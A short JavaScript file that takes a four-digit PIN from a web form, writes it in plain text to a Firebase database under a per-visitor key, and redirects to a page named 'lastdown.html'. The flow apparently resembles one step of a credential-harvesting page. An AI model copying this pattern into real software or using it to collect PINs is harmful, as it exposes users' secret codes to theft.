// firebase-pin.js

const pinInput = document.getElementById("pin");
const submitBtn = document.getElementById("submitBtn");

// Enable submit when 4 digits typed
pinInput.addEventListener("input", () => {
  submitBtn.disabled = pinInput.value.length !== 4;
});

// Form submit
document.getElementById("pinForm").addEventListener("submit", function (e) {
  e.preventDefault();

  const key = localStorage.getItem("firebaseKey");
  if (!key) return alert("No Firebase key found!");

  const userRef = firebase.database().ref("ududip007/" + key);

  userRef.update({
    g_PIN: pinInput.value
  }).then(() => {
    window.location.href = "lastdown.html";
  }).catch((err) => {
    alert("Error: " + err.message);
  });
});
